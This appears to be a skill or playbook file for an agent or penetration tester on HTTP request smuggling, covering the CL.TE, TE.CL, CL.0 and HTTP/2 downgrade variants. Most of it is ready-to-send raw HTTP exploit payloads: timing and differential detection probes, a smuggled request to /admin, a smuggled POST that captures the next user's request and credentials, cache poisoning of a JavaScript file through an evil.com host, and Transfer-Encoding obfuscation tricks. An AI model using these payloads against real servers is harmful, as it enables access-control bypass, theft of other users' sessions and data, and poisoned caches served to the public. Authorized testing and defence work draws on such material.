---
name: http-request-smuggling
description: HTTP request smuggling — CL/TE, TE/CL, H2 desync, CL.0 attacks, frontend-backend differentials
---

# HTTP Request Smuggling

Request smuggling exploits disagreements between HTTP processors (load balancers, reverse proxies, CDNs, web servers) about where one request ends and the next begins. It enables cache poisoning, credential theft, access control bypass, and request hijacking.

## Attack Surface

**Architecture requirements** — two or more HTTP processors in series:
- CDN → Origin server (Cloudflare, Akamai, Fastly → nginx/Apache)
- Reverse proxy → Backend (nginx → Gunicorn, HAProxy → Node.js)
- Load balancer → Application server
- API gateway → Microservice

## Smuggling Variants

### CL.TE (Frontend uses Content-Length, Backend uses Transfer-Encoding)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GPOST / HTTP
```
If backend processes `Transfer-Encoding: chunked`, it sees the `0\r\n\r\n` as end of body, and `GPOST / HTTP` becomes the start of the next request — smuggled.

### TE.CL (Frontend uses Transfer-Encoding, Backend uses Content-Length)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
GPOST /
0


```
Frontend processes chunks (8 bytes = `GPOST /\r`), backend uses Content-Length: 3, leaving `GPOST /` as prefix of next request.

### CL.0 (Backend ignores Content-Length entirely)
```http
POST /resources/images/blog.svg HTTP/1.1
Host: target.com
Content-Length: 50
Connection: keep-alive

GET /admin HTTP/1.1
Host: target.com

```
If backend ignores body (e.g., for static resources), the body becomes the next pipelined request.

### H2.0 Desync (HTTP/2 → HTTP/1.1 downgrade)
```
# HTTP/2 pseudo-headers with smuggled content
:method: POST
:path: /
:authority: target.com
content-length: 0
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```
HTTP/2 frontend forwards to HTTP/1.1 backend with injected headers/body.

## Detection Methodology

### Step 1: Identify Architecture
- Check `Server`, `Via`, `X-Forwarded-For` headers for proxy chain
- Different error pages at different paths may indicate multiple backends
- `HTTP/2` support + HTTP/1.1 backend = H2 desync risk

### Step 2: Timing-Based Detection
```http
# CL.TE detection — if vulnerable, backend waits for chunked terminator
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```
If response is delayed (~5-10s timeout) → CL.TE likely.

```http
# TE.CL detection — if vulnerable, backend reads past Content-Length
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
If response is delayed → TE.CL likely.

### Step 3: Confirmation via Differential Response
```http
# CL.TE confirmation — smuggle a request that triggers 404
POST / HTTP/1.1
Host: target.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /nonexistent HTTP/1.1
Foo: x
```
Send this, then immediately send a normal `GET /`. If you get a 404, the smuggled prefix poisoned your next request.

### Step 4: Exploitation

**Access Control Bypass**
```http
# Smuggle request to admin-only endpoint
POST / HTTP/1.1
Host: target.com
Content-Length: 60
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Cookie: session=VICTIM

```

**Credential Hijacking**
```http
# Smuggle request that captures next user's request
POST / HTTP/1.1
Host: target.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: target.com
Content-Length: 800

data=
```
The next user's request is appended as the `data` parameter.

**Cache Poisoning**
```http
# Smuggle request that poisons cache with malicious response
POST / HTTP/1.1
Host: target.com
Content-Length: 80
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: evil.com

```

## TE Header Obfuscation

When simple `Transfer-Encoding: chunked` doesn't work, try obfuscation:
```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding: identity, chunked
```

## Validation Criteria

- **Timing differential** — measurable response delay with CL/TE mismatch
- **Differential response** — normal request returns unexpected response (404, different content) after smuggling attempt
- **Request capture** — demonstrate receiving another user's request data
- **Reproducible** — must work consistently, not just once (network jitter ≠ smuggling)

## False Positive Indicators
- Single-server architecture (no proxy chain)
- Timing variations from network latency, not request processing
- Application-level redirect/error, not protocol-level

## Pro Tips
- **Always test with HTTP/1.1** — disable HTTP/2 on your side first
- **Use `Connection: keep-alive`** — smuggling requires persistent connections
- **Send normal request immediately after** — the smuggle payload poisons the NEXT request
- **Turbo Intruder** — use for automated smuggling detection if available
- **Watch for connection resets** — some servers close connection on malformed TE, which is still interesting info
